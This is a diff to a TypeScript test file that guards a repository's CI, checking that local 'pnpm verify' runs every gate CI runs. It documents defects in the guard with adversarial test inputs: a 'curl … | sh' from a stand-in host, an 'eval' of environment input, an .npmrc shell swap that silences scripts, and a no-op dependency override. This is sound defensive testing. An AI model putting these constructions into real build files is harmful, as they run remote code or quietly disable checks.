  * comment ships in.
  *
  * Read by {@link readWorkflowSurface}, and by nothing else.
@@ -1069,14 +1074,14 @@ const SHELL_SETTING_FILES = ['.npmrc', 'pnpm-workspace.yaml', 'pnpm-workspace.ym
  *     script-shell=C:/Program Files/Git/usr/bin/true.exe
  *
  * to the tracked `.npmrc` — `package.json` and `ci.yml` byte-identical — was
- * `172 passed (172)`, exit 0. The runtime half, established in a scratch package
+ * **green**, exit 0. The runtime half, established in a scratch package
  * on pnpm 10.33.0 rather than in the worktree: with a body of
  * `node -e "console.log('GATE_A_RAN')" && node -e "console.log('GATE_B_RAN')"`,
  * `pnpm verify` under that `.npmrc` printed the body, printed **neither** gate
  * line (`grep -nx GATE_A_RAN` and `grep -nx GATE_B_RAN` both exit 1) and exited
  * 0; with the `.npmrc` removed the same body printed `GATE_A_RAN` on line 5 and
  * `GATE_B_RAN` on line 6. A guard whose top line is "`pnpm verify` must be a
- * superset of CI" certified, at 172/172, a tree in which `pnpm verify` executes
+ * superset of CI" certified a tree in which `pnpm verify` executes
  * nothing — and CI's own `pnpm test` step with it, which is defect six's
  * relationship (this file certifying the empty set) reached through a file
  * instead of through a script body.
@@ -1115,11 +1120,11 @@ const NPMRC_KEYS: readonly string[] = [
  * Read at module load, and by *the shell that reads a script body is one this
  * reader assumed*. Load-bearing, measured on the tree this comment ships in,
  * twice each: making the unknown-key branch return instead of throw is
- * `1 failed | 195 passed (196)`, exit 1 twice, and dropping `.npmrc` from
+ * **one red**, exit 1 twice, and dropping `.npmrc` from
  * {@link SHELL_SETTING_FILES} is the same — both at that case, because the
  * tracked `.npmrc` carries only keys {@link NPMRC_KEYS} lists and a rule over
  * clean input asserts nothing. Emptying {@link ROOT_SURFACE}, which is the
- * wiring rather than the rule, is `2 failed | 194 passed (196)`, exit 1 twice —
+ * wiring rather than the rule, is **two reds**, exit 1 twice —
  * that case and the root pin together, because a `.npmrc` the enumeration never
  * reported is a `.npmrc` this reader never opened.
  */
@@ -1174,7 +1179,7 @@ function refuseScriptInterpretation(repoRoot: string, rootFiles: readonly string
  * root, whose `readPackage` hook is a JavaScript body pnpm runs during
  * `pnpm install` — the one command {@link SETUP_COMMANDS} exempts by name, which
  * CI runs in three jobs and `pnpm verify` runs in none. Measured on the tree
- * that shipped after round four, twice: `181 passed (181)`, exit 0, with
+ * that shipped after round four, twice: **green**, exit 0, with
  * `ci.yml` and `package.json` byte-identical. The byte-equivalent work written
  * as the manifest key {@link LIFECYCLE_SCRIPTS} closed — a root `postinstall` —
  * was red twice at *the setup exemption for "pnpm install" covers no work of its
@@ -1198,12 +1203,12 @@ function refuseScriptInterpretation(repoRoot: string, rootFiles: readonly string
  * the point: the enumeration answers what is there and this list answers what
  * was read. Load-bearing, measured on
  * the tree this comment ships in, twice each: adding a `.pnpmfile.cjs` to the
- * root is `1 failed | 195 passed (196)`, exit 1, at that case, and emptying
- * {@link ROOT_SURFACE} is `2 failed | 194 passed (196)`, exit 1 — that case and
+ * root is **one red**, exit 1, at that case, and emptying
+ * {@link ROOT_SURFACE} is **two reds**, exit 1 — that case and
  * the `.npmrc` one, since {@link refuseScriptInterpretation} reads the same
  * enumeration. What is NOT caught, and is in the header's "cannot see" list
  * rather than left to be found: replacing the enumeration's result with a copy
- * of this list is `196 passed (196)`, exit 0 twice.
+ * of this list is **green**, exit 0 twice.
  */
 const ROOT_FILES = [
   '.gitattributes',
@@ -1244,7 +1249,7 @@ const ROOT_FILES = [
  * tracked whatever `.gitignore` says. Measured on the tree this comment ships
  * in, twice: a root `.env` — already on this list and already a `.gitignore`
  * line — is skipped by the enumeration and invisible to the pin
- * (`210 passed (210)`, exit 0), while `git check-ignore -v .env` prints
+ * (**green**, exit 0), while `git check-ignore -v .env` prints
  * `.gitignore:33:.env` and `git add -f --dry-run .env` prints `add '.env'`. So a root file that is both gitignored and force-tracked would
  * reach CI unseen by this guard. **That is a known limit, not a closed hole**,
  * and it is left open rather than closed because closing it means asking git
@@ -1367,7 +1372,7 @@ const SHELL_SETTINGS: readonly string[] = refuseScriptInterpretation(REPO_ROOT, 
  * closed. This file bound the manifest as `{ scripts }` and read `.scripts` at
  * every use site, so that block was read past in silence. Adding a sibling key
  * to it — `"overrides": { "vitest": "npm:@vela/noop-vitest@1.0.0" }` — with
- * `ci.yml` and `.npmrc` byte-identical, was **`181 passed (181)`, exit 0**,
+ * `ci.yml` and `.npmrc` byte-identical, was ****green**, exit 0**,
  * twice, on the tree that shipped after round four.
  *
  * The refusal is the default branch, not a rule about `overrides` in
@@ -1387,7 +1392,7 @@ const SHELL_SETTINGS: readonly string[] = refuseScriptInterpretation(REPO_ROOT, 
  *
  * Read by {@link refuseManifestKeys}, and by nothing else. Load-bearing,
  * measured on the tree this comment ships in, twice: making the unknown-key
- * branch unreachable is `1 failed | 195 passed (196)`, exit 1, at *the manifest
+ * branch unreachable is **one red**, exit 1, at *the manifest
  * is read whole, not for the one key this file wanted* — the real manifest
  * carries only keys this list names, so the rule has to be asked about a
  * manifest this tree does not contain.
@@ -1422,9 +1427,9 @@ const MANIFEST_KEYS: readonly string[] = [
  *
  * Read by {@link refuseManifestKeys}, and by nothing else. Load-bearing,
  * measured on the tree this comment ships in, twice: making that branch
- * unreachable is `1 failed | 195 passed (196)`, exit 1, at the same case — and
+ * unreachable is **one red**, exit 1, at the same case — and
  * on the real `package.json` it is what turns the adversary's `overrides` key
- * from `181 passed (181)` into a module-load refusal, `no tests`, exit 1 twice.
+ * from **green** into a module-load refusal, `no tests`, exit 1 twice.
  */
 const PNPM_MANIFEST_KEYS: readonly string[] = ['onlyBuiltDependencies'];
 
@@ -1447,7 +1452,7 @@ const PNPM_MANIFEST_KEYS: readonly string[] = ['onlyBuiltDependencies'];
  *
  * Read by {@link refuseManifestKeys}, and by nothing else. Load-bearing,
  * measured on the tree this comment ships in, twice: making the comparison
- * unreachable is `1 failed | 195 passed (196)`, exit 1, at *the manifest is read
+ * unreachable is **one red**, exit 1, at *the manifest is read
  * whole, not for the one key this file wanted*, which asks it about a list this
  * repository does not have.
  */
@@ -1580,7 +1585,7 @@ const PACKAGE = MANIFEST as { scripts: Record<string, string> };
  * **Its membership was pinned by nothing until round six, which is RULE V over
  * the list that decides what the totality net may ignore.** Measured on the tree
  * that shipped after round five, twice each: appending `'pnpm
- * probe-smuggled-gate'` here was `196 passed (196)`, exit 0, and so was the same
+ * probe-smuggled-gate'` here was **green**, exit 0, and so was the same
  * edit with the matching step really added to `ci.yml`'s `static` job — CI
  * running a gate `pnpm verify` never reaches, at full green. Removing an entry
  * CI does run reddens; adding one was invisible. Two rules stand behind it now,
@@ -1640,8 +1645,8 @@ const SETUP_COMMANDS: readonly string[] = [
  * both trees, twice each: narrowing this list to `['postinstall', 'prepare']` —
  * the only two the case below hands it — and adding `"preinstall": "node
  * scripts/run-bash.mjs scripts/probe-preinstall-gate.sh"` to `package.json` was
- * `196 passed (196)`, exit 0 on the tree that shipped after round five, and is
- * `1 failed | 209 passed (210)`, exit 1 on the tree this comment ships in, at
+ * **green**, exit 0 on the tree that shipped after round five, and is
+ * **one red**, exit 1 on the tree this comment ships in, at
  * *the setup exemption for "pnpm install" covers no work of its own* — because
  * the script name is now a review before this list gets a say. Shrinking this
  * list alone still reddens nothing, and what that costs is now an
@@ -1652,7 +1657,7 @@ const SETUP_COMMANDS: readonly string[] = [
  * exemption for "pnpm install" covers no work of its own* calls three times, on
  * the real manifest and on two hand-built ones. The two hand-built calls are why
  * this list is not an unread write: measured on the tree this comment ships in,
- * twice, emptying it to `[]` is `1 failed | 195 passed (196)`, exit 1 twice —
+ * twice, emptying it to `[]` is **one red**, exit 1 twice —
  * against the real manifest alone it would stay green, because the real manifest
  * declares none of these.
  */
@@ -1691,8 +1696,8 @@ function lifecycleScriptsIn(scripts: Record<string, string>): string[] {
  * pnpm's own documented `pnpm:devPreinstall` was not among them. Measured on the
  * tree that shipped after round five, twice: `"pnpm:devPreinstall": "node
  * scripts/run-bash.mjs scripts/probe-devpreinstall-gate.sh"` added to `scripts`
- * was `196 passed (196)`, exit 0, while the **byte-identical body** written
- * under `"postinstall"` was `1 failed | 195 passed (196)`, exit 1, at *the setup
+ * was **green**, exit 0, while the **byte-identical body** written
+ * under `"postinstall"` was **one red**, exit 1, at *the setup
  * exemption for "pnpm install" covers no work of its own*. One referent, two key
  * spellings in one document, opposite verdicts, in the direction this file
  * exists to forbid — CI work no `pnpm verify` ever runs, riding the one command
@@ -1736,7 +1741,7 @@ const SCRIPT_NAMES: readonly string[] = [
  * RULE V applied to that list. `SETUP_COMMANDS` decides which commands CI runs
  * that the totality net `unaccounted` is allowed to ignore, and its membership
  * was pinned by nothing: appending `'pnpm probe-smuggled-gate'` to it was
- * `196 passed (196)`, exit 0, twice on the tree that shipped after round five,
+ * **green**, exit 0, twice on the tree that shipped after round five,
  * and so was the same edit with a matching real step added to `ci.yml` — CI
  * running a gate `pnpm verify` never reaches, at full green. Removing an entry
  * reddens; adding one was invisible.
@@ -1792,8 +1797,8 @@ function nonSetupCommands(commands: readonly string[]): string[] {
  * case, which the sentence did not say.
  *
  * Load-bearing, measured on the tree this comment ships in, twice: dropping the
- * `existsSync` so the question goes back to being about spelling is `1 failed |
- * 195 passed (196)`, exit 1 twice, at *accepts the argument shapes the shipped
+ * `existsSync` so the question goes back to being about spelling is **one red**,
+ * exit 1 twice, at *accepts the argument shapes the shipped
  * chain really uses — the control*.
  */
 function repositoryPath(argument: string): string | undefined {
@@ -1821,7 +1826,7 @@ const everyArgumentIsFlagOrPath = (args: readonly string[]): boolean =>
  * commands — `exit 0`, eight `pnpm <script>` invocations, `cd src-tauri` and two
  * `cargo` gates — which {@link chainOf} expands to twenty-four commands, every
  * one of them parsed, gating and reached. It satisfied every row, ran nothing,
- * and exited 0. It was **141/141 green**, twice, on the tree that shipped after
+ * and exited 0. It was **green**, twice, on the tree that shipped after
  * round two.
  *
  * ### Defect eighteen: the net was one token wide
@@ -1836,9 +1841,9 @@ const everyArgumentIsFlagOrPath = (args: readonly string[]): boolean =>
  *     pnpm exec sh -c "curl -s http://example.invalid/gate.sh | sh" &&
  *       node -e "eval(process.env.PROBE||'')" &&
  *
- * to the shipped chain was `172 passed (172)`, exit 0 twice — while the
+ * to the shipped chain was **green**, exit 0 twice — while the
  * byte-equivalent `sh -c "…"` written with `sh` in the program position was
- * `1 failed | 171 passed (172)`, exit 1 twice, with the message that names the
+ * **one red**, exit 1 twice, with the message that names the
  * property being violated ("runs text that is not in this repository"). Both programs were on the list; `sh`, `eval`, a pipe into `sh`
  * and code taken from the environment were all in the chain, all parsed, all
  * gating and reached. One invocation, two spellings, opposite verdicts, inside
@@ -1965,8 +1970,20 @@ const VERIFY_INVOCATIONS: readonly VerifyInvocation[] = [
  *
  * Load-bearing, measured on the tree this comment ships in, twice: dropping
  * `entry.accepts(command)` so this goes back to round three's program-token test
- * is `5 failed | 191 passed (196)`, exit 1 twice — the four *defect eighteen*
- * rows and the control beside them.
+ * is **seven reds**, exit 1 twice — the four *defect eighteen* rows, the control
+ * beside them, and the two RULE V rows *refuses "pnpm exec vitest run" wherever
+ * it stands in the chain* and *refuses "pnpm dlx some-package" wherever it
+ * stands in the chain*.
+ *
+ * A previous version of this sentence said **five reds** and named "the four
+ * *defect eighteen* rows and the control beside them", which was the red set of
+ * the round BEFORE the two RULE V rows were added — and they were added by the
+ * same round that wrote the sentence. That is this file's own recurring shape:
+ * a sentence about a suite, written in the round that changed the suite. The
+ * lesson taken is in the header's first bullet — the red COUNT is a property of
+ * the mutation and stays; a red SET has to be re-read from the log body every
+ * time the file grows, so it is written out in full here rather than summarised
+ * as "and the control beside them".
  */
 function acceptsInvocation(command: ParsedCommand): VerifyInvocation | undefined {
   return VERIFY_INVOCATIONS.find((entry) => entry.program === command.program && entry.accepts(command));
@@ -2159,7 +2176,7 @@ describe('the local gate is a superset of the remote one', () => {
 
     // RULE V over LOADED_EXTENSIONS. The split above is what decides whether a
     // file in that directory is READ or merely counted, and the constant had no
-    // case of its own: dropping `'.yaml'` was `196 passed (196)`, exit 0, twice
+    // case of its own: dropping `'.yaml'` was **green**, exit 0, twice
     // on the tree that shipped after round five. The property survived by
     // accident — a real `.yaml` in the directory then lands in `ignoredFiles`
     // and reddens the equality above — so what was missing is the rule, asked of
@@ -2215,7 +2232,7 @@ describe('the local gate is a superset of the remote one', () => {
     // direction until round six: `refuseWith` refuses an input that is NOT
     // listed, so removing `'version'` from `pnpm/action-setup@v4` is `no tests`
     // at module load — while ADDING `'probe-input'` to `actions/checkout@v4`'s
-    // empty list was `196 passed (196)`, exit 0, twice on the tree that shipped
+    // empty list was **green**, exit 0, twice on the tree that shipped
     // after round five. An input listed here and handed to nobody is the hole
     // the comment above describes, held open one key further in.
     expect(
@@ -2301,7 +2318,7 @@ describe('the local gate is a superset of the remote one', () => {
     // a sentence — "Every key in TOP_LEVEL_KEYS, JOB_KEYS and STEP_KEYS is now
     // either read by something below or in this sentence" — and a sentence is
     // not a guard: appending 'container' to JOB_KEYS and writing a `container:`
-    // on `test-ts` was `196 passed (196)`, exit 0, twice on the tree that
+    // on `test-ts` was **green**, exit 0, twice on the tree that
     // shipped after round five, which is the "listed as known and read by
     // nothing" shape this file has now fixed five times.
     const admitted = [...new Set([...TOP_LEVEL_KEYS, ...JOB_KEYS, ...STEP_KEYS])].sort();
@@ -2333,7 +2350,7 @@ describe('the local gate is a superset of the remote one', () => {
     //
     // Measured on the tree that shipped after round two, twice each:
     // `"verify:harness": "pnpm test:click-harness || pnpm test:harness"` spliced
-    // into the chain in place of `pnpm test:harness` was 141/141 green, while
+    // into the chain in place of `pnpm test:harness` was green, while
     // the same two commands with the gate moved to the LEFT of the same `||`
     // was 2 failed | 139 passed. One referent, two positions across one
     // operator, and the position this file admitted was the one where the gate
@@ -2375,7 +2392,7 @@ describe('the local gate is a superset of the remote one', () => {
     // `pnpm <script>` invocations, `cd src-tauri` and two `cargo` gates — which
     // `chainOf` expands to twenty-four commands, every one parsed, gating and
     // reached, of which `pnpm verify` runs none. Measured on the tree that
-    // shipped after round two, twice: 141/141 green. It is defect six's own
+    // shipped after round two, twice: green. It is defect six's own
     // headline construction — `"verify": "echo \"CI still runs …\""` — one level
     // down, against the reader built to kill it.
     //
@@ -2423,7 +2440,7 @@ describe('the local gate is a superset of the remote one', () => {
     // whole suite was 91, twice: change CI's build gate to `cargo build
     // --workspace --locked --all-targets`, update this row's `ci` to match —
     // which `unaccounted` forces you to do — and leave `runs` describing the old
-    // command, and the file was 91/91 green while `pnpm verify` ran strictly
+    // command, and the file was green while `pnpm verify` ran strictly
     // less than CI. That is the one relationship this file exists to deny.
     //
     // The gate stays a hand-written predicate rather than a string comparison —
@@ -2460,7 +2477,7 @@ describe('the local gate is a superset of the remote one', () => {
     //
     // Measured on the tree carrying the fix for defects four to six, whose
     // whole suite was 91, twice: `run: pnpm test:harness || pnpm test:harness`
-    // left the file 91/91 green. `unaccounted` stayed empty because both halves
+    // left the file green. `unaccounted` stayed empty because both halves
     // are listed gates, and every row above went on asserting "CI runs pnpm
     // test:harness" about a step whose failure CI would ignore.
     //
@@ -2606,7 +2623,7 @@ describe('the documents this guard opens are the documents that are there', () =
     // that list names three files to OPEN, so a fourth name is not refused, it
     // is invisible. A tracked `.pnpmfile.cjs` — a JavaScript body pnpm runs
     // during the one command SETUP_COMMANDS exempts by name — was
-    // `181 passed (181)`, exit 0, twice, on the tree that shipped after round
+    // **green**, exit 0, twice, on the tree that shipped after round
     // four, while the byte-equivalent work written as a root `postinstall` was
     // red at *the setup exemption for "pnpm install" covers no work of its own*.
     expect(
@@ -2640,7 +2657,7 @@ describe('the documents this guard opens are the documents that are there', () =
     // that object decides which dependency install scripts run — factor 3 of the
     // header's four, the one it calls closed. Adding `"overrides": { "vitest":
     // "npm:@vela/noop-vitest@1.0.0" }` beside the key already there was
-    // `181 passed (181)`, exit 0, twice, on the tree that shipped after round
+    // **green**, exit 0, twice, on the tree that shipped after round
     // four.
     expect(MANIFEST_SETTINGS).toEqual(['onlyBuiltDependencies']);
 
@@ -2746,8 +2763,7 @@ describe('the workflow is read as a document, not as lines', () => {
     ])('reads a $spelling run: key', ({ key }) => {
       // The whole of defect four. Every fix before this one hardened how the
       // VALUE may be written; the KEY was never a variable, and two double-quote
-      // characters were the difference between a module-load refusal and 42/42
-      // green. A YAML parser has no such notion: it unquotes the key and hands
+      // characters were the difference between a module-load refusal and a green run. A YAML parser has no such notion: it unquotes the key and hands
       // back `run`.
       const model = probe(`      - ${key}: pnpm probe-unlisted-gate`)();
       expect(model.jobs[0]?.steps[0]?.run).toBe('pnpm probe-unlisted-gate');
@@ -2890,7 +2906,7 @@ describe('the workflow is read as a document, not as lines', () => {
         resolves: '.github/workflows/reusable.yml',
       },
     ])('resolves $shape before deciding — defect eleven', ({ written, resolves }) => {
-      // Each of these was 117/117 green before this fix, measured twice each on
+      // Each of these was green before this fix, measured twice each on
       // the tree carrying the fixes for seven to ten, and not by missing the old
       // reader's patterns: each one *matched* them. The old arm tested the
       // unresolved bytes, so anything beginning `./.github/workflows/` and
@@ -2925,7 +2941,7 @@ describe('the workflow is read as a document, not as lines', () => {
     ])('refuses $shape, which it cannot place — defect eleven', ({ written }) => {
       // The default is refusal. Before this fix every one of these fell off the
       // end of `refuseUses` and was silently classified as a third-party action;
-      // `.github/actions/probe-composite` was measured 117/117 green twice. Some
+      // `.github/actions/probe-composite` was measured green twice. Some
       // of these the runner may well reject outright — that costs a review, and
       // the alternative costs a gate.
       expect(probe(`      - uses: ${written}`)).toThrow('this reader cannot place');
@@ -3076,7 +3092,7 @@ describe('the workflow is read as a document, not as lines', () => {
     ])('refuses a remote reusable workflow whose extension is $spelling — round two', ({ written }) => {
       // Round two's second finding. With `/\.ya?ml@/u` the upper-case spelling
       // reached `isThirdPartyAction` and was admitted on the tree that shipped
-      // after round two — 141/141 green, twice —
+      // after round two — green, twice —
       // while the byte-identical target spelled `.yml@` was red twice. One
       // referent, two spellings, opposite verdicts, inside the function the
       // round-two commit says it converted from spelling to fact.
@@ -3115,7 +3131,7 @@ describe('the workflow is read as a document, not as lines', () => {
       // environment variable INPUT_<NAME>, so this is one channel with two
       // spellings and the pin read one of them. Measured on the tree that
       // shipped after round three, twice: `env: INPUT_RUN_INSTALL:` on the
-      // pinned `pnpm/action-setup@v4` step of `static` was `172 passed (172)`,
+      // pinned `pnpm/action-setup@v4` step of `static` was **green**,
       // exit 0, while the byte-equivalent `with: run_install:` on the identical
       // step took that file down at module load, exit 1 twice, by name.
       //
@@ -3187,7 +3203,7 @@ describe('the workflow is read as a document, not as lines', () => {
       // `unenforcedGates` prove the rule reads it. Neither says the flag survives
       // the trip between them, and that trip is where defect ten actually lived.
       // Measured on the tree that carried the fix for defect ten, whose whole
-      // suite was 116: reintroducing the drop here was 116/116 green with both of
+      // suite was 116: reintroducing the drop here was green with both of
       // those in place.
       expect(commandsOf(probe('      - run: pnpm test:harness || pnpm test:harness')().jobs)).toEqual([
         { file: 'probe.yml', job: 'probe', command: 'pnpm test:harness', gating: false, reached: true },
@@ -3233,7 +3249,7 @@ describe('the workflow is read as a document, not as lines', () => {
       // *this step* declared one it could not split; the question is what shell
       // the step actually runs under, and a workflow default answers it just as
       // completely. Listing `defaults` in TOP_LEVEL_KEYS and never reading it
-      // was 91/91 green with these three lines in the file.
+      // was green with these three lines in the file.
       expect(
         withDefaults(['  run:', '    shell: python'], '      - run: print("hi")'),
       ).toThrow('runs under "shell: python", set as the workflow default,');
@@ -3279,7 +3295,7 @@ describe('the workflow is read as a document, not as lines', () => {
       // Defect fourteen. The refusal used to be `scalarOf(...) === 'true'`, an
       // exact byte comparison against one of the three spellings YAML 1.2's core
       // schema resolves to boolean true — so `continue-on-error: True` on the
-      // `Typecheck` step of `static` was 141/141 green, twice, while the same
+      // `Typecheck` step of `static` was green, twice, while the same
       // step spelled `true` was red twice at module load. One key, one value,
       // two spellings, opposite verdicts, inside the refusal this file argues
       // hardest for. The old hand-set case planted only the lowercase spelling,
@@ -3323,7 +3339,7 @@ describe('the workflow is read as a document, not as lines', () => {
       // argument for why it must be, and the identical key at JOB level was
       // listed in JOB_KEYS as known and read nowhere. On `static` it takes
       // `pnpm typecheck`, `cargo fmt --all --check` and `cargo clippy` out of
-      // the set of things that can fail CI, and it was 141/141 green.
+      // the set of things that can fail CI, and it was green.
       const text = [
         'jobs:',
         '  probe:',
@@ -3464,7 +3480,7 @@ describe('the workflow is read as a document, not as lines', () => {
     ])('refuses a trigger filtered on $named — defect twenty-five', ({ filter, named }) => {
       // Measured on the tree that shipped after round four, twice:
       // `paths-ignore: ['**']` under both `push:` and `pull_request:` in the
-      // real `ci.yml` — every gate byte-identical — was `181 passed (181)`,
+      // real `ci.yml` — every gate byte-identical — was **green**,
       // exit 0. The parser read the line correctly and the model dropped it.
       expect(document('on:', '  push:', filter)).toThrow(named);
     });
@@ -3477,7 +3493,7 @@ describe('the workflow is read as a document, not as lines', () => {
       // Renaming this repository's `static:` job and leaving its three
       // `needs: static` lines alone makes GitHub reject the entire file, so no
       // job in it runs on any event. Measured on the tree that shipped after
-      // round four, twice: `181 passed (181)`, exit 0.
+      // round four, twice: **green**, exit 0.
       expect(
         document('on:', '  push:', '    branches: [main]'),
       ).not.toThrow();
@@ -3560,7 +3576,7 @@ describe('the workflow is read as a document, not as lines', () => {
       // an `env:` sharing a mapping with a `uses:`; GitHub merges the two outer
       // scopes into every step. Measured on the tree that shipped after round
       // four, twice each: workflow-level `INPUT_REPOSITORY` and job-level
-      // `INPUT_RUN_INSTALL` were both `181 passed (181)`, exit 0, while the same
+      // `INPUT_RUN_INSTALL` were both **green**, exit 0, while the same
       // two lines on a `uses:` step were `no tests`, exit 1.
       const run =
         scope === 'workflow'
@@ -3584,7 +3600,7 @@ describe('the workflow is read as a document, not as lines', () => {
       // `parseWorkflowYaml` strips the quotes in its value reader, so the
       // resolver never saw them. Measured on the tree that shipped after round
       // four, twice each: `continue-on-error: 'false'` on the `static` job was
-      // `181 passed (181)` exit 0 and `'true'` was `no tests` exit 1 — the
+      // **green** exit 0 and `'true'` was `no tests` exit 1 — the
       // quoted spellings resolving exactly like the plain ones. The unsafe half
       // is `'false'`, which took the allow-branch on a fact nobody established.
       const valueOf = (written: string): YamlNode | undefined => {
@@ -3631,10 +3647,10 @@ describe('a local uses: is judged against the files the enumeration really read'
   // `modelOf` a set assembled by hand, so all of them stay green under a
   // `readWorkflowSurface` that passes the wrong set. Re-measured on the tree
   // this comment ships in, twice each, exit 1 twice each: replacing the
-  // enumeration with `new Set<string>()` is `1 failed | 195 passed (196)`, and
+  // enumeration with `new Set<string>()` is **one red**, and
   // the one red is the first case here — that mutation is invisible to every
   // other case in the file. Dropping the membership test so that any `./` path
-  // is admitted is `18 failed | 178 passed (196)`, and the second case here is
+  // is admitted is **eighteen reds**, and the second case here is
   // ONE of those eighteen: the other SEVENTEEN are hand-set `uses:` cases above
   // — 3 in *a key is a key whatever its quoting — defect four* and 14 in *a
   // uses: is refused on what it names, not on how it is written* — which is
@@ -3720,7 +3736,7 @@ describe('a command line is read as the commands it runs', () => {
       .map((c) => c.text);
 
   it('splits a && chain into its simple commands — defect five', () => {
-    // `pnpm install --frozen-lockfile && pnpm probe-smuggled-gate` was 42/42
+    // `pnpm install --frozen-lockfile && pnpm probe-smuggled-gate` was green
     // green three times over, because the exemption asked whether the command
     // *began* with setup and never whether it was *only* setup.
     expect(texts('pnpm install --frozen-lockfile && pnpm probe-smuggled-gate')).toEqual([
@@ -3808,7 +3824,7 @@ describe('verify is read as commands that execute, not as text that mentions the
     { program: 'echo', text: 'echo pnpm typecheck' },
   ])('does not read $program’s arguments as an invocation', ({ text }) => {
     // Both spellings. The quoted one is the construction that was measured
-    // 42/42 green; the unquoted one is what a second agent would reach for once
+    // green; the unquoted one is what a second agent would reach for once
     // the quoted one stopped working, and it is the reason the fix cannot be
     // "strip quoted spans".
     expect(pnpmScript(parseCommand(text))).toBeUndefined();
@@ -3948,7 +3964,7 @@ describe('verify is read as commands that execute, not as text that mentions the
     // Asked of the rule directly. `ci.yml` contains no suppressed gate, so with
     // this rule written inline it asserted nothing about itself: dropping the
     // `gating` flag on the way into COMMANDS — which is defect ten put straight
-    // back — was 115/115 green, twice, on the tree of 115 that carried it, and
+    // back — was green, twice, on the tree of 115 that carried it, and
     // only reddened once a
     // mutated `ci.yml` supplied the input the tree does not have.
     const gates: CiGate[] = [{ ci: 'pnpm test', runs: (c) => runsPnpm(c, 'test') }];
@@ -4019,7 +4035,7 @@ describe('verify is read as commands that execute, not as text that mentions the
   ])('refuses "%s" wherever it stands in the chain — RULE V over VERIFY_INVOCATIONS', (text) => {
     // RULE V. VERIFY_INVOCATIONS' doc names the class it exists to refuse, and
     // nothing asserted it: prepending `{ program: 'sh', shape: 'sh <anything>',
-    // accepts: () => true }` to the list was `196 passed (196)`, exit 0, twice
+    // accepts: () => true }` to the list was **green**, exit 0, twice
     // on the tree that shipped after round five. All four *defect eighteen* rows
     // put a program the list DOES name in the program position, so every one of
     // them stayed green. The rule is asked here directly, of the programs the
@@ -4068,9 +4084,9 @@ describe('verify is read as commands that execute, not as text that mentions the
     // written in this repository" — a property of the invocation, asserted about
     // the token. Every body here has a listed program in the program position.
     // Measured on the tree that shipped after round three, twice each: the
-    // first two prefixed to the shipped chain were `172 passed (172)`, exit 0,
+    // first two prefixed to the shipped chain were **green**, exit 0,
     // while the byte-equivalent `sh -c "…"` with `sh` in the program position
-    // was `1 failed | 171 passed (172)`, exit 1. One invocation, two spellings,
+    // was **one red**, exit 1. One invocation, two spellings,
     // opposite verdicts.
     expect(unclassifiedVerifyCommands(chainOf('probe', { probe: body }))).toEqual([report]);
   });
@@ -4112,7 +4128,7 @@ describe('verify is read as commands that execute, not as text that mentions the
     // (172)`, exit 0, with every gate row satisfied against bodies that do not
     // run — while renaming one of those invocations to a name only `probe`'s
     // manifest declares, which changes nothing about what executes, was
-    // `1 failed | 171 passed (172)`, exit 1 twice.
+    // **one red**, exit 1 twice.
     const chain = chainOf('probe', {
       probe: 'cd src-tauri && pnpm typecheck',
       typecheck: 'tsc --build --force',
@@ -4185,7 +4201,7 @@ describe('verify is read as commands that execute, not as text that mentions the
     // Defect twenty-nine. The assertion above is a MEMBERSHIP filter, so it can
     // only ever object to a name somebody already wrote down. What it says
     // nothing about is the complement, and pnpm's own `pnpm:devPreinstall` sits
-    // there: `196 passed (196)`, exit 0, twice, against `1 failed | 195 passed
+    // there: **green**, exit 0, twice, against `1 failed | 195 passed
     // (196)` for the byte-identical body under `postinstall`. The complement is
     // pinned here, so a script name nobody has decided about is a review whether
     // or not this reader knows what pnpm does with it.
@@ -4203,7 +4219,7 @@ describe('verify is read as commands that execute, not as text that mentions the
   it('every command the setup list exempts is setup, and is one CI runs', () => {
     // RULE V over SETUP_COMMANDS. That list decides what the totality net is
     // allowed to ignore, and nothing pinned its membership: appending
-    // `'pnpm probe-smuggled-gate'` was `196 passed (196)`, exit 0, twice on the
+    // `'pnpm probe-smuggled-gate'` was **green**, exit 0, twice on the
     // tree that shipped after round five, and so was the same edit with the
     // matching step really added to `ci.yml`'s `static` job.
     //
@@ -4243,7 +4259,7 @@ describe('verify is read as commands that execute, not as text that mentions the
     // this round the token `npmrc` occurred zero times in this file. Measured on
     // the tree that shipped after round three, twice: appending
     // `script-shell=C:/Program Files/Git/usr/bin/true.exe` to `.npmrc`, with
-    // `package.json` and `ci.yml` byte-identical, was `172 passed (172)`, exit 0
+    // `package.json` and `ci.yml` byte-identical, was **green**, exit 0
     // — a tree in which `pnpm verify` and CI's own `pnpm test` step both execute
     // nothing.
     //
@@ -5097,16 +5113,25 @@ interface WorkflowJob {
 /** What this reader made of one workflow file. */
 interface WorkflowModel {
   /**
-   * The file this model was read from, relative to `.github/workflows/`. Read
-   * by *every gate CI has is one it runs on the events this claim assumes*,
-   * which reports the triggers per file, and by nothing else — before that case
-   * it was a field written by `modelOf` and read by nothing, which round four's
-   * critic recorded and this file's own comment on {@link WorkflowStep} calls a
-   * defect of its own. Measured on the tree this comment ships in, twice:
-   * writing `'MUTATED-UNREAD'` here is `1 failed | 195 passed (196)`, exit 1.
-   * Round four's critic reported that same mutation on that tree as
-   * `181 passed (181)`, exit 0, twice; that reading is theirs and was not
-   * re-run here.
+   * The file this model was read from, relative to `.github/workflows/`.
+   *
+   * Read in **two** places, and by nothing else: *every gate CI has is one it
+   * runs on the events this claim assumes*, which reports the triggers per file,
+   * and the RULE-V-over-LOADED_EXTENSIONS block inside *every workflow file the
+   * runner would load is one this guard reads*, which asserts
+   * `probe.models.map((model) => model.file)` against the scratch directory it
+   * built. Before either it was a field written by `modelOf` and read by
+   * nothing, which round four's critic recorded and this file's own comment on
+   * {@link WorkflowStep} calls a defect of its own.
+   *
+   * A previous version of this sentence named only the first reader and said
+   * "and by nothing else", in the same round that added the second — which is
+   * exactly the mistake the sibling comment on {@link WorkflowModel.triggers}
+   * records having already made once. Measured on the tree this comment ships
+   * in, twice: writing `'MUTATED-UNREAD'` in `modelOf`'s return is **two reds**,
+   * exit 1, at both of the cases named above. Round four's critic reported that
+   * same mutation on that tree as green, exit 0, twice; that reading is theirs
+   * and was not re-run here.
    */
   readonly file: string;
   /**
@@ -5119,7 +5144,7 @@ interface WorkflowModel {
    * else"; both readers were added by the same commit that wrote it. Mutating
    * {@link triggersOf} to return the pinned list reddens **both**, which is the
    * measurement that shows the sentence was wrong rather than merely imprecise:
-   * `5 failed | 191 passed (196)` on the tree that shipped after round five.
+   * **five reds** on the tree that shipped after round five.
    */
   readonly triggers: readonly string[];
   /**
@@ -5178,7 +5203,7 @@ interface WorkflowCommand {
